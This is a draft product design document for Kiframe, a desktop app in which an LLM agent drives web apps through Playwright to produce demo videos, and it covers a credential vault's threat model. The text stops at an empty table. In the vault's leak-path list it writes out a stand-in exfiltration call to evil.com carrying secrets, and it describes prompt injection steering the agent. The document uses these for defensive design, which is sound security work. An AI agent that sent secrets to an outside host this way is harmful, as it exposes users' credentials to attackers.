# Kiframe: AI-generated product demo videos

> Status: draft for discussion. Created 2026-09-25, revised 2026-09-26 after an adversarial review.
> Idea: chat with an agent to describe a scenario. The agent drives the real app, and the result is a polished demo (video, guide…). Nobody has to record their screen.
> Companion docs: [OBJECT-MODEL.md](./OBJECT-MODEL.md) (data model), [COMPETITORS.md](./COMPETITORS.md), [IMPLEMENTATION-PLAN.md](./IMPLEMENTATION-PLAN.md).

---

## 0. Decisions so far

| Topic | Decision | Date |
|---|---|---|
| Goal | A real product, not an internal tool | 2026-09-25 |
| Name | **Kiframe** (replaces Dimo). Tagline idea: "No time to waste" | 2026-09-25 |
| Output v0 | **Captions only** (voiceover later). Output kinds in v0: **video + guide** | 2026-09-26 |
| Targets | **v0: web apps.** v0.1: Electron. Later: Tauri (see §6b, partial support only) | 2026-09-26 |
| Electron attach | **`--remote-debugging-port=0` + `connectOverCDP`** by default: works on hardened packaged apps, where `_electron.launch` doesn't (§6b, PHASE0-FINDINGS F4) | 2026-09-27 |
| Access to the app | **Black box**: no test IDs or seed hooks required in the customer's app. When the agent is blocked, it asks the user | 2026-09-25 |
| App state | ICP requires a **resettable demo/staging account**. One login per recording batch (session reuse). Pre-approved `teardown` per environment. One idempotency primitive, `ensure` (§7.2) | 2026-09-26 |
| Where it runs | **Locally, as a desktop app (Electron).** Agent, automation, capture and rendering run on the user's machine | 2026-09-26 |
| Why desktop | Reach **localhost / VPN / internal apps**, keep **recordings and secrets on the machine**. *Not* a margin argument (§10.1) | 2026-09-26 |
| LLM access | **BYOK** (user's own API key) *or* **Kiframe account** (our server proxies LLM calls = the paid product) | 2026-09-25 |
| Agent stack | **cooldown's agent loop** (moved to the Node main process) + its **OpenAI-compatible `LlmClient`** (the `openai` SDK), pointed at **OpenRouter** by default (many models, one key) or OpenAI directly. Replaces the Anthropic-native client planned on 2026-09-26 (user preference). Not the Claude Agent SDK (§10b) | 2026-09-27 |
| Automation | **Playwright library** in the Node main process. The agent's browser tools are **our own tools built on it, not Playwright MCP**, so every action and output passes through the vault's resolver/scrubber and the event logger. Fallback: computer use for canvas-heavy UIs | 2026-09-26 |
| Capture | **CDP only** (`page.screencast` / CDP screencast) at **deviceScaleFactor 2**, in a **headed window on a high-DPI screen**: headless screencasts come out at CSS resolution (Phase 0 F1), headed ones at device pixels (F2). Headless stays for tests and CI. **No native OS window capture** (it needs the screen-recording permission, has a monthly re-consent on macOS, and the user can interfere). Desktop window frames are composited in post | 2026-09-27 |
| Rendering | Own **compositor (Canvas 2D; PixiJS if the preview needs it) + WebCodecs + Mediabunny in the frontend**. Preview = export | 2026-09-27 (PHASE0-FINDINGS F3) |
| Source vs artifacts | **Scenes are objects, video is a build artifact.** Takes are **pinned** (referenced by an export, a named version or the active composition, never evicted) or **scratch** (evictable). See OBJECT-MODEL §0.7 | 2026-09-26 |
| Credentials | **Vault**: the agent can see which secrets exist but can never read their values. Hardened leak paths (§7.4) | 2026-09-26 |
| Accounts | **User + Org** model: each user has a **personal org** and a `defaultOrgId`, and can be invited to other orgs. Billing and shared settings at org level. Vault values stay **per user, per machine**, never synced (§10c) | 2026-09-26 |
| Server stack | **TypeScript on Node.js (24 LTS)**, not Bun, with **Hono** + Postgres + Drizzle, to share `packages/schema` with the desktop app. One runtime for the whole monorepo (Electron main and Playwright are Node anyway). Hono is runtime-agnostic, so moving to Bun later would be cheap. cooldown's proxy **design** is ported, not its Python code (IMPLEMENTATION-PLAN §1) | 2026-09-26 |
| Account required | **Yes, a free account for everyone, BYOK included.** Orgs, invitations and settings sync need it. Works offline after the first sign-in (§10c) | 2026-09-26 |
| Phase 0 test apps | Web: **app.dim0.net** (ours). Electron: **smterm** (github.com/vcmf/smterm, ours) for P0-10. Plus one third-party web app for grounding (P0-8), chosen then | 2026-09-26 |
| Phase 0 review rule | Spike PRs: `/code-review medium`. A finding is **severe** only if it blocks the Phase 0 exit criteria on the test apps. Everything else goes to the backlog / failure catalogue and is fixed when a real app hits it. `high` review from v0 and for security PRs | 2026-09-26 |
| Versions | **v0** = first release (Sequence list, no canvas). **v0.1** = canvas + Electron targets (§11) | 2026-09-26 |
| Order after M1's secrets work | **A vertical slice first** (`epic/app-slice`: minimal project store, agent loop, Electron shell + chat, preview player), then the visual rebuild V2–V4 (SECRETS-DESIGN §5). Until V2–V4 land, the app records only on throwaway accounts | 2026-09-30 |
| App window (v0) | **Chat left, stage right:** the chat is a fixed side column; the main area has the preview player on top and the scene strip (the sequence) below | 2026-09-30 |
| App look (v0) | **Light theme, neutral greys** (no warm tint), one accent: the tally orange-red `#D63D17` (record, live, primary buttons). Type: Instrument Sans for the UI, JetBrains Mono for titles, ids, timecodes and tool names. Icons: Phosphor (regular; fill for play / stop / record). The stage has Preview and Live app tabs; a risky step's approval is a card in the chat, a secret's approval a dialog with the field outlined; while the agent works the composer becomes a status bar with Stop. Mockup: the "Kiframe app mockup" canvas (claude.ai) | 2026-10-02 |
| Branches | **Epics:** `epic/<name>` branches collect a milestone's PRs (CI and review on each), then merge into `main` | 2026-09-30 |
| Secret approval's screenshot | **The page as it is**, unmasked: the user's own screen shown to the user only (in memory, dropped once answered; never to the agent, a take or a file). Masking typed values in it proved fragile (layout moving between the shot and the boxes, iframe offsets, stuck frames); a crop safe enough would show nothing useful. The step has brought the field into view, so its outline is in the shot | 2026-10-02 |
| Stop | **A stop runs nothing more**, not even the teardown (nor the cleanup an `ensure` runs): what the run left is cleaned by the scene's `ensure` at its next run. Any failure once the run's signal aborted is a stop (a dialog it closed). A scene without an `ensure` keeps what a stopped run made | 2026-09-30 |

---

## 1. Problem

Recording a demo video for a new feature or a "how to use" guide is slow, manual work:

- Seed realistic data and put the app in the right state
- Rehearse the clicks, then record, and redo it after every mistake
- Edit: cut dead time, zoom on important areas, add captions or a voiceover
- **Redo all of it whenever the UI changes.** Demos and help-center screenshots go stale quickly. **This maintenance is the real pain**, since a single one-off demo only takes a human about 10 minutes.

## 2. Why it's feasible now

- LLM agents can already drive a web UI: Claude with Playwright can navigate, click, fill forms and read the accessibility tree. Kiframe wraps the Playwright library in its own tools (see §0).
- Playwright can stream frames with timestamps (`page.screencast`, [docs](https://playwright.dev/docs/api/class-screencast)), take screenshots and emulate devices.
- Browsers can now encode video natively and with hardware acceleration (WebCodecs), so compositing and export can run in the app's own frontend.
- TTS is good enough for voiceovers later (ElevenLabs, OpenAI, local Kokoro…).

What doesn't exist yet is the pipeline that connects these pieces, **and keeps demos up to date**. That's the product.

## 3. Key insight: split *authoring* from *rendering*

**Don't film the agent while it works.** A live agent session looks bad on video:
- It pauses for seconds while the LLM thinks
- It hesitates, backtracks and retries after misclicks
- Headless Playwright has no visible mouse cursor
- Two runs never produce the same result

Instead, the agent **figures out** the scenario and then **compiles** it into a deterministic script. A separate runtime replays that script at human pace, and the compositor renders it with polished visuals.

```
 ┌────────────┐   ┌──────────────┐   ┌─────────────┐   ┌──────────────┐   ┌──────────────┐
 │ 1. Chat    │──▶│ 2. Explore & │──▶│ 3. Record   │──▶│ 4. Compose   │──▶│ 5. Export    │
 │ scenario   │   │    ground    │   │ (replay)    │   │ (generators  │   │ video/guide  │
 │ (LLM)      │   │ (LLM+browser)│   │ determinist.│   │  + edits)    │   │              │
 └────────────┘   └──────────────┘   └─────────────┘   └──────────────┘   └──────────────┘
       ▲                                                                          │
       └──────────────── 6. Iterate: "slow down step 3", "zoom on the chart" ◀────┘
```

Steps 1–2 (and healing) need the LLM. Steps 3–5 need **no LLM at all**: they are cheap and repeatable. When you give feedback, usually only step 4 or 3 has to run again.

---

## 4. Pipeline in detail

The data formats (scenario, take, composition) are specified in [OBJECT-MODEL.md](./OBJECT-MODEL.md). This section describes the flow.

### 4.1 Scenario authoring (chat)
The user says something like: *"Show how a manager creates a project, invites a teammate and assigns the first task."*
The agent asks follow-up questions: target audience, length, which environment and account to use, and which parts to emphasize. It then proposes **scenes** ("Create a project", "Invite a teammate", "Assign a task"), each with a short scenario (off-camera `setup` + `steps`). Format: OBJECT-MODEL §2.

### 4.2 Explore & ground (agent + live browser)
- The agent runs each scene against the real app through Kiframe's browser tools and turns each step's natural-language `intent` into a **grounded target** (role, label or text locators, plus fallbacks and a visual fingerprint). No test IDs.
- It checks that each step works and records the expected state (`expect`).
- It produces a **screenshot storyboard** so the user can approve the flow before recording.
- It flags problems ("the Invite button is disabled for this role") and asks the user what to do (§7.3).
- **Cost and latency: measured in Phase 0** (F6): **$0.01–0.02 per scene** with DeepSeek V4.1 Flash, $0.17–0.22 with GLM 5.3, 2.7–12 minutes, prompt caching at 94–97% (the earlier guess was $0.5–3). Wall time (one tool call per turn) is the constraint, not cost. Mitigations still apply: trim snapshots to the region around the target, prompt caching, and caching grounding results per locator.

### 4.3 Record (replay)
The runtime (no LLM) replays the grounded scenario and writes a **take**. Details: OBJECT-MODEL §3.
- **Cursor:** the runtime plans a human-like path (Bézier curve + Fitts's law) and moves the real mouse, so hover states happen. The cursor is **drawn at render time**, not baked into the pixels.
- **Human typing:** character by character with small random delays.
- **Frozen time and data** where possible: mock `Date`, disable some animations, `hide` noisy widgets.
- **Event log:** timestamps plus the bounding box of every action. Post-production needs these for zoom, highlights, blur and the guide's screenshots.
- **Interrupts** (cookie banners, "What's new" modals) are checked **explicitly before each step's cursor travel**, not through a background handler (OBJECT-MODEL §2b).

### 4.4 Compose
- **Generators** (pure functions) produce a default composition from the take: camera framing on the target element, speed-ups of idle time, captions, blur on sensitive fields, click effects. OBJECT-MODEL §4.1.
- **Caption pacing (v0):** a caption stays on screen for its reading time (about 180 words per minute, **2s minimum**). A caption window or a `pause` is **never sped up**. If the action is shorter than the caption, the renderer adds a **freeze frame** (it doesn't change the scenario).
- The user and the agent edit the composition (chat, and later the editor). Edits are `manual` segments that survive regeneration.

### 4.5 Export
- **v0:** MP4/WebM video (16:9, and 9:16/1:1 presets) + **guide** (Markdown/HTML/PDF with one highlighted screenshot per step).
- Later: GIF per scene, HTML presentation, voiceover, intro/outro cards from a brand kit.

### 4.6 Iterate
The user gives feedback in chat and the agent edits the objects:
- "Slower on step 3" or "remove the intro" → re-render only (seconds)
- "Also show the settings page" → ground the new steps, then re-record that scene only
- **UI changed after a release** → **heal** the broken targets and re-record the stale scenes. **This is the core differentiator and ships early** (basic heal in v0, see §11).

---

## 5. Approaches compared

| | A. Film the agent live | **B. Agent writes script, deterministic replay** | C. DOM capture (rrweb) and render | D. Screenshot storyboard, animated |
|---|---|---|---|---|
| How | Record the agent's Playwright session and cut the dead time | Agent explores, compiles steps, clean replay | Record DOM mutations and replay them in a controlled player | Agent takes screenshots at each step and they get animated (Ken Burns, transitions) |
| Quality | Low (jerky, no cursor) | **High** | High, and camera moves can be changed freely after the fact | Medium (looks like slides) |
| Reproducible | No | **Yes** | Yes | Yes |
| Re-render cost | Full agent run | **Cheap** | Very cheap | Very cheap |
| Robustness | — | Good | Breaks on canvas, WebGL, video, iframes | Very robust |
| Complexity | Low | Medium | High | Low |
| Verdict | Prototype only | **Recommended core** | Later spike (OBJECT-MODEL §0.7) | Covered by the `still` scene kind |

## 6. Capture technology

| Option | Quality | Notes |
|---|---|---|
| Playwright `recordVideo` | Medium (fixed-bitrate VP8, looks soft once zoomed) | Easiest. **Not used**, since the zoom makes its softness visible |
| **`page.screencast` / CDP screencast** at deviceScaleFactor 2 | **Good**, and sharp under zoom **when headed on a high-DPI screen** (headless gives CSS resolution: Phase 0 F1, F2) | `onFrame` gives each frame with a timestamp. No permission prompts. **The v0 choice**, in a headed window (where it lives on screen is open) |
| Virtual-time frame stepping (`HeadlessExperimental.beginFrame`) | Perfect frames | Slow. Chrome support in the new headless mode is unverified. A possible "max quality" mode |
| Native OS window capture (ScreenCaptureKit, Windows Graphics Capture) | Good | **Rejected:** screen-recording permission, a monthly re-consent prompt on macOS Sequoia, a visible window the user can disturb |
| Headed Chrome in Xvfb + ffmpeg | Best | Linux only. Relevant only for a future cloud/CI render worker |

**The camera zoom is capped by the source resolution.** At DPR 2 on a 1440×900 viewport, the source is 2880×1800, so a 2× zoom into a 1080p output stays sharp. Device-pixel frames need a **headed** window on a high-DPI screen: headless screencast frames are CSS resolution (PHASE0-FINDINGS F1, F2).

Note: capture does involve encoding. Screencast frames (JPEG) are encoded into the take's video, through WebCodecs in the frontend or an ffmpeg step in Node. Which one is decided in Phase 0.

## 6b. Desktop targets: Electron vs Tauri

"Web stack" doesn't always mean "Playwright can drive it". What matters is **which web engine the app runs on**:

| Target | Web engine | Playwright? | Plan |
|---|---|---|---|
| Web app | Chromium | ✅ Full support | **v0** |
| Electron (dev build or unhardened app) | Bundled Chromium | ✅ `connectOverCDP` (default), or `_electron.launch()` for dev builds | **v0.1** |
| Electron (packaged + hardened) | Bundled Chromium | ⚠️ `_electron.launch()` fails when the app turned off the `EnableNodeCliInspectArguments` fuse. **`--remote-debugging-port` + `connectOverCDP` works** (measured on smterm with hardened fuses, PHASE0-FINDINGS F4): the default for Electron targets, unless the app strips the switch | v0.1 |
| Tauri on **Windows** | WebView2 (Chromium) | ✅ CDP attach (`WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=…`) | Later |
| Tauri on **macOS** | WKWebView (WebKit) | ❌ No CDP, no Playwright, and **tauri-driver doesn't support macOS** either | Workaround 1 only |
| Tauri on **Linux** | WebKitGTK | ⚠️ WebDriver only (`tauri-driver`), not Playwright | Later, second driver |

Tauri workarounds:
1. **Run the Tauri frontend in Chromium** (its dev server) and mock the Rust backend with `@tauri-apps/api/mocks` (`mockIPC`). The UI is identical, but backend responses have to be faked or proxied.
2. A WebDriver driver (`tauri-driver`) next to Playwright, Linux and Windows only.
3. Capture on Windows through WebView2 and CDP.

**Desktop window frame:** since we only capture web content through CDP, the title bar and desktop background are **composited** by the renderer (a style option).

---

## 7. Black-box operation (no test IDs, no seed hooks)

Because the product must work on apps it doesn't control, the agent behaves like a **new human user**.

### 7.1 Finding elements without test IDs
- Main method: the **accessibility tree** (role and accessible name), then visible text and labels, through Playwright's `ariaSnapshot()` (the same approach Playwright MCP uses).
- For each step, store **several locator candidates** plus a screenshot crop of the target element. If one breaks, try the next. If all of them break, the agent heals the step, using the crop as visual reference.
- Last resort for canvas-heavy or poorly accessible UIs: **vision and coordinates** (computer-use style), flagged as fragile.

### 7.2 App state without seed hooks
Recording creates data on the app ("Q4 Launch" is created on camera), and **every** re-record, including the first one after grounding, would create it again. Rules:
- **ICP requirement:** a **dedicated demo/staging account that the user can reset**. It's a hard requirement in v0, stated during onboarding.
- **Environments** (org-level, §10c) carry a **`sandbox`** flag. On a sandbox environment, the user **pre-approves** destructive actions once (for example "Kiframe may delete projects named *Q4 Launch*"). On other environments, every risky action asks.
- **`teardown`** block per scene (off-camera, runs after recording): deletes what the scene created. It's pre-approved on sandbox environments, so replays and CI can run unattended.
- **`ensure`**: the **only** idempotency primitive, and it's declarative, not a condition: `ensure: { absent: <locator> }` or `ensure: { present: <locator> }` in `setup`. The runtime makes the state true (running the scene's teardown if needed) or fails with a clear message. No `if` anywhere else (OBJECT-MODEL §2b).
- **One login per recording batch:** log in once through the vault, then reuse the Playwright `storageState` (encrypted, in memory or keychain) for all scenes of the batch. v0 (M1-4, `recordBatch`): saved in memory when the session preset is done (not at the end of the scene), a fresh context per scene, and a fresh login after a scene that reused the session failed. Logging in again in every scene would trigger rate limits, "new device" emails and 2FA prompts.
- The user can also just say "the account is already in the right state". The agent checks it with `expect` during grounding.

### 7.3 Blockers → ask the user (human in the loop)
The agent drives the app, and when it's stuck it **pauses and asks** instead of guessing. **The answer becomes a durable rule** (a secret, an interrupt, a hide, a corrected target, a teardown), so each blocker is solved once per project.

| Blocker | What the agent does |
|---|---|
| Login form | Checks `vault.list()`. If the secret is missing, calls `vault.request()` and the user fills in a native form (§7.4) |
| 2FA / OTP | Asks the user for the code, or reuses a saved session. *(TOTP seeds in the vault: later)* |
| SSO / captcha / hardware key | Hands over to the human once (live browser view) and saves the session. Never tries to bypass |
| Missing data ("no projects to show") | Proposes off-camera setup steps, or asks the user to prepare the data |
| Permission denied / feature flag off | Explains what it saw and asks for another account or environment |
| Ambiguous UI ("two Save buttons") | Shows a screenshot and asks which one |
| **Risky action** (delete, send email, pay, invite real people) | **Asks for explicit confirmation**, unless pre-approved on a sandbox environment (§7.2) |

### 7.4 Credentials: the Vault

**Rule: the agent knows *what* secrets exist, never *what they are*.**

#### What the agent can do (tools)
| Tool | Returns | Never returns |
|---|---|---|
| `vault.list()` | Names and metadata: `{ name: "acme_staging.password", kind: "password", origins: ["https://staging.acme.com"], field: {...}, updatedAt }` | Values |
| `vault.request(name, kind, origin, reason)` | Opens a **native form in the Kiframe UI** where the user types the value. The agent receives only `"provided"` or `"declined"` | Values |
| `browser.fill(target, "{{secrets.acme_staging.password}}")` | `"ok"` | The resolved value |

The chat never contains secret values. If a user pastes one there anyway, we detect it and offer to move it to the vault and redact it from the message.

#### Where values live
- In the **OS keychain** (macOS Keychain, Windows Credential Manager, libsecret on Linux). **Per user, per machine**: values are never synced to the org or our server. The org can only declare which secret **names** a project needs (§10c).
- Values are resolved **only inside the local automation runtime** at the moment of the `fill`. They never enter the LLM context, logs, scenario files or our server, even in paid mode, where only the LLM calls go through our proxy.

#### Leak paths and how we close them
1. **Read-back through tool output** (aria snapshots show a field's value, e.g. `textbox "Email": bob@acme.com`). → An **output scrubber** on every tool result replaces secret values with `[secret:name]`. It matches **exact values and encoded variants** (URL-encoded, JSON-escaped, HTML-escaped, base64 including `Basic` auth, different case) and values split across DOM nodes (it matches on normalized page text).
2. **A secret shown elsewhere on screen** ("Logged in as bob@acme.com", avatar menus, error messages like "No account for bob@…"). → At every capture frame, the runtime **scans visible DOM text** for secret values and emits `sensitive` rects (blurred in the video). Screenshots sent to the LLM get the same blur **before** they leave the runtime.
3. **Exfiltration by prompt injection or a confused agent** (`goto("https://evil.com/?x={{secrets…}}")`, filling a secret into a same-origin comment or search field). → A secret resolves **only in `fill`/`type` actions**, **only on its allowed origins**, and **only into its bound field**: the target must match the field recorded when the secret was first used (locator + `input type`/`autocomplete`). Never in URLs, JS, captions or any other field.
4. **Browser storage.** → Automation runs in **ephemeral browser contexts** with password saving and autofill **disabled**. The only persisted state is the encrypted `storageState` of §7.2.
5. **Traces and logs.** → **Playwright tracing is off** (traces record `fill` arguments in plain text). Our own event log stores the secret **name** only (`type_start { secret: "…" }`), and `navigate` URLs go through the scrubber.
6. **JS evaluation.** → No `evaluate` in steps. In setup, only with confirmation, and **never on a page where a secret was filled** (it could read `input.value`).
7. **Raw takes on disk.** → Blur happens at render time, so raw takes in the cache contain unblurred frames. → **The take cache is sensitive:** it's encrypted at rest (or at least stored in the app's protected data directory and documented as sensitive). It's never included in exports or git.
8. **Screenshots through the paid proxy.** → They get the same blur as in point 2 before leaving the machine. The retention policy is still to decide (§12).
9. **The final video.** → Filled secret fields and detected occurrences are blurred. Typing a secret shows `••••`, even in non-password fields.

#### v0 implementation (M1-5, redesigned: docs/SECRETS-DESIGN.md)
**The contract is docs/SECRETS-DESIGN.md** (threat model, invariants, approvals, visual rules); this is a summary.
- Values: the OS keychain through keyring-rs (`@napi-rs/keyring`), one entry per secret name under the `Kiframe` service. Metadata (name, kind, origins, `updatedAt`) and the user's **grants**: a local `vault.json` (mode 0600) in the app data directory, never in a project, never synced. A metadata file that doesn't parse is an error, never reset.
- `request` validates the name, kind and origin **before** the form is shown; the agent gets `"provided"` / `"declined"`. A secret's kind can't be changed by a later request.
- **Approval at writing time:** a secret is typed only by a step the user approved (a grant: the host's project scope, the step's key, the exact target, a path pattern with ids as `*`, the element's tag, type and label, the origin). An interactive run asks when a use has no grant (`requestApproval`), with the element resolved on the live page; a headless run fails. Healing a secret step's target asks again.
- The runtime sets the value on a handle to the approved element (its value setter, then `input` and `change` events, read back; the origin, path and element checked again right before), never typed to whatever has focus; paste, and copy or drag from a field holding a secret, are refused.

#### v0 scrubber and scanner (M1-6)
- **Scrubber** (`scrubSecrets`): exact values and their URL, form, double-URL, path, base64 (url), JSON and HTML encodings, ignoring case, longest first in one pass; a raw value of 4+ characters also matches when split by whitespace or line breaks (page text across nodes, accessibility snapshots). Errors and navigate URLs go through it.
- **Scanner** (`scanSecretText`): the page's visible text nodes and field values (not password inputs, not hidden text), in the viewport, are pulled into Node and matched there, per block (a value split across nodes is found); the secret values never enter the page. Rects come from the page's own Range layout.
- **While recording**, the scan runs at every step boundary and every 300 ms; each occurrence is a `sensitive` region (`secret-text`) that follows it and ends when it's gone. A new one is **backdated to the previous scan** (no frame shows it unblurred), and to the run's start for a value that just became known; an unsure scan (a re-render mid-scan) ends nothing. Scans are bounded (2 s). Values come from the secrets resolved in the run plus `knownSecretValues` (the project's secrets, for a scene whose login was skipped).
- **Model screenshots** (`screenshotForModel`): scanned before and after the screenshot, the union painted over in Node; a page that can't be scanned gives no screenshot.

#### v0 hardening (M1-7)
- **Ephemeral contexts:** every scene runs in a fresh `browser.newContext()` (`recordBatch`), off the record: nothing a run typed (no saved password, no autofill entry) outlives its context but the batch's in-memory session. No extra Chromium flags: the ones that exist are no-ops or onboarding-only, and adding a `--disable-features` replaces Playwright's own.
- **Written to the approved element:** a secret is set on a handle to the input the vault approved (its value setter and input events, its current value kept, read back), never sent to whatever has focus. A navigation between the checks and the write detaches the handle: nothing is written anywhere. Secrets go only into an input or a textarea.
- **No traces:** no source file in `packages/`, `apps/` or `scripts/` touches Playwright's trace API (a test fails if one does).
- **No `evaluate`:** v0 has no JavaScript step at all (stricter than "setup only, with confirmation"): the schema rejects it, and a secret reference anywhere but a `type` value is rejected too.
- **Exfiltration suite** (`packages/runtime/test/exfiltration.test.ts`): hostile pages that mirror the typed secret into text and into their URL (the text blurred and painted over in the model's screenshot, pixel by pixel; no encoding of it in any file of the take), move focus to another field when the password field is focused (nothing typed), leave for another origin on focus (nothing typed there), and spy on the DOM and string APIs the runtime's page code calls (string arguments only: no value ever passed). The test secret has URL-special characters, so its encodings differ. Run with `pnpm test`.

#### Secret kinds
- v0: `password`, `username`, `api_key`, generic `text`, `session` (saved `storageState`).
- Later: `totp_seed` (the vault generates the current 2FA code at fill time).

#### Remaining human fallbacks
Captchas and SSO/OAuth redirects that ask for an email code, a push notification or a hardware key can't be automated. For those, the user takes over the browser once and we save the session. This stays an exception, not the main flow.

---

## 8. Hard problems and risks

1. **App state and auth** (§7.2): resettable demo accounts, teardown, one login per batch.
2. **Non-determinism.** Loading spinners, timestamps, A/B flags and random IDs. Handle with `waitFor` conditions, `Date` freezing, disabled animations, `hide`, and cutting long waits.
3. **Video quality.** Soft capture plus zoom looks blurry: DPR 2 capture, zoom capped by source resolution (§6).
4. **Scope of targets.** Web first. Electron is less easy than it looks for hardened apps (§6b). Tauri is partial. Native mobile and desktop are out of scope.
5. **Tasteful output.** "Technically correct" isn't the same as "nice to watch". Pacing and camera choices are where the product has to earn its keep. We need good defaults plus style presets.
6. **Security.** The agent gets a browser logged into the user's app. Vault hardening (§7.4), sandbox environments, never production admin by default. Enterprise IT will scrutinize an app that drives logged-in browsers.
7. **LLM cost and latency** of grounding and healing: grounding measured in Phase 0 ($0.01–0.22 and 2.7–12 min per scene, §4.2); healing still unmeasured.
8. **Desktop distribution costs:** Apple notarization, Windows code signing, an auto-updater, downloading Playwright's Chromium (~150 MB) on first run, and no server-side logs to debug field failures (we need opt-in crash and failure reporting).

## 8b. Taming the edge cases (strategy)

> Observation (2026-09-26): the more we design, the more edge cases show up. That's probably **why no product has won this market yet**. Demosmith markets "95% right first try". When a run goes wrong, the fallback is a manual editor or a new run from scratch. Our strategy: **assume the edge cases exist and make them cheap**.

1. **Narrow the target (ICP) for v0:** B2B SaaS **web apps** with a **resettable staging or demo account**, a reasonably accessible UI (buttons and fields with labels), and teams that ship often. Out of v0: heavy canvas UIs (Figma-like), apps without a test environment, desktop and mobile targets.
2. **The human is the fallback, not a failure.** When the agent is stuck, it **asks** (§7.3), and the answer becomes a **durable rule**. Every edge case is solved **once per project**, not on every run.
3. **Make failure local and cheap:**
   - self-contained scenes, so one scene failing doesn't break the others
   - only stale scenes are re-recorded
   - re-renders cost nothing (no LLM)
   - a precise error message ("scene 3, step *name-project*: field not found") rather than "generation failed"
4. **Automatic 80%, editable 20%.** Generators produce a good default, and the composition stays **editable** (`manual` segments kept). No need to automate everything perfectly, as long as fixing things is fast.
5. **Deterministic by design:** no conditions in scenarios (only `ensure`), interruptions handled at project level, waits on conditions, frozen time and data where possible.
6. **Measure the edge cases instead of guessing them:** from Phase 0 on, keep a **catalogue of real failures** (app, step, cause, fix). It becomes the roadmap, the agent's test suite, and eventually built-in rules (a bank of known cookie-banner interrupts, shared per org, §10c).
7. **Robustness and maintenance are the moat.** Chat, a storyboard and a local vault are **parity features** that others can copy. What's hard to copy is a system that recovers, heals and keeps a whole library of demos and guides up to date, and gets better with each project.

## 9. Prior art (researched 2026-09-25, licenses re-checked 2026-09-26)

Data-model lessons: [OBJECT-MODEL.md](./OBJECT-MODEL.md). Commercial analysis: [COMPETITORS.md](./COMPETITORS.md).

**Open source, "scenario → demo video"** (the closest to us, all young and small):
| Project | License | What to take from it |
|---|---|---|
| [demo-machine](https://github.com/45ck/demo-machine) | MIT | The closest match: `.demo.yaml` with chapters/steps, semantic targets (`by: role/label/text`), pacing, narration sync, redaction, MCP server, **automated video QA** (blank or frozen frames) |
| [playwright-recast](https://github.com/ThePatriczek/playwright-recast) | MIT | Treats the Playwright trace as the source of truth. A **speed multiplier per class of time** (idle, action, network), autoZoom, cursorOverlay, TTS |
| [programatic-demo](https://github.com/ashrafchowdury/programatic-demo) | MIT | Playwright capture + Remotion render. **Click clusters → camera keyframes** with timing rules. A "clapperboard" sync frame |
| [aidemo](https://aidemo.top/) | MIT | Agent writes `storyboard.json`, local deterministic replay, re-render in CI |
| Playwright [`page.screencast`](https://playwright.dev/docs/api/class-screencast) (v1.59) | Apache-2.0 | **Verified:** `onFrame` with timestamps, `showActions`/`showChapter` overlays. Our capture base |

**Open source, post-production (Screen Studio-like):**
| Project | License | What to take from it |
|---|---|---|
| [Cap](https://github.com/CapSoftware/Cap) | **AGPL-3.0** (except MIT `cap-camera*`/`scap-*` crates): ideas only | The best **multi-track timeline model** (`zoomSegments`, `maskSegments`, `captionSegments`, `keyboardSegments`…) |
| [OpenScreen](https://github.com/siddharthvaddem/openscreen) | MIT (archived 2026-06-17, community continuation) | Electron + PixiJS, like our stack. `ZoomRegion` with normalized focus and `source: auto/manual`, spring camera (`zoomSpring.ts`). Code we can reuse |
| [Screenize](https://github.com/syi0808/screenize) | Apache-2.0 | Generators that turn events into tracks. Cursor-follow with dead zone and look-ahead |
| [ghost-cursor](https://github.com/Xetera/ghost-cursor) | MIT | Human-like cursor paths (Bézier curves, Fitts's-law speed, overshoot) |
| [VHS](https://github.com/charmbracelet/vhs) | MIT | Terminal "tape → video": global `Set` style, `Hide/Show` for setup, `Wait` on a condition |

**Rendering frameworks:**
- **Remotion** is the most mature. It's [free for companies of up to 3 employees](https://www.remotion.dev/docs/license/pricing), including automation. Beyond that, the "Automators" usage-based license applies to rendering embedded in an app like ours.
- Revideo (MIT) and Editly (MIT, a declarative JSON spec, slowing down) are the alternatives.

→ We still lean toward our own PixiJS compositor (OBJECT-MODEL §5). The reason is **control** (preview = export, the spring camera, data-driven tracks), not licensing. Remotion is a viable fallback while we're small.

**Agent-driven, commercial:** **Demosmith** and **Bingeable**. A cloud agent turns a URL + prompt into a video, web only, with credentials handed to their cloud. → [COMPETITORS.md](./COMPETITORS.md).

**Commercial, human-recorded** (Arcade, Supademo, Storylane, Navattic, Guidde, Clueso, Screen Studio): all need **a human to record**. The shared pattern is *one capture → video + interactive demo + written guide*.

## 10. Kiframe as a desktop app

### 10.1 Why desktop (and what it costs)
**Real reasons:**
- The agent has to reach **localhost**, staging behind a VPN, internal apps, and (from v0.1) **desktop apps**. A cloud browser can't.
- **Secrets and recordings stay on the machine** (§7.4). That's a trust argument for B2B.
- Re-renders run locally, so they're **unlimited** in every plan.

**Not a reason:** margins. Competitors' variable costs are the LLM and TTS, not GPUs, and a cloud product can also re-render a stored recording cheaply. BYOK means zero variable cost *and* zero LLM revenue. Pricing is a product question (COMPETITORS §4).

**Costs to plan for:**
- **Distribution:** Apple notarization, Windows code signing, auto-updates, and a Playwright Chromium download on first run. We need to budget for these in the v0 release, not as an afterthought.
- **Uneven hardware:** WebCodecs hardware encoders with software fallback, and a render-time estimate. 4K on an old laptop will be slow.
- **Background rendering:** a render queue, pause and resume, no UI freeze, a warning on battery.
- **Field debugging:** opt-in failure reports (scrubbed), since we have no server-side logs.
- **CI / "regenerate on every release":** the same engine packaged as a **headless CLI**. Caveat: **Playwright's bundled Chromium has no H.264**, so in CI the compositor must run in **Electron's Chromium or `channel: "chrome"`**, with a VP9/AV1 fallback. A possible paid option.
- **Sharing with a team:** outputs are local. Hosting and share links could be a paid option.

### 10.2 Electron vs Tauri for Kiframe itself: **Electron** (decided)
| | Electron | Tauri |
|---|---|---|
| Playwright, the agent loop, Node tools | Run **directly in the main process** (Node built in) | Need a **Node sidecar** process plus IPC between Rust and Node |
| Languages | TS everywhere | Rust + TS + a sidecar protocol |
| Frontend video (WebCodecs, preview = export) | **Chromium everywhere**, so the same encoders and behavior on every OS | WKWebView (macOS) and WebKitGTK (Linux) have weaker or different WebCodecs support |
| App size | ~100 MB + Playwright's Chromium | Small shell, but the Node sidecar and Chromium bring most of that size back |
| Dogfooding | Kiframe can record Kiframe demos (Electron target) | Only partially (§6b) |
| Reuse of cooldown | The agent loop has **no Tauri imports**, so it works in either shell. Board persistence (`sqlite-engine.ts`, Tauri) has to be rewritten for our folder format anyway | Same |

### 10.3 LLM access: two modes
| Mode | How | Notes |
|---|---|---|
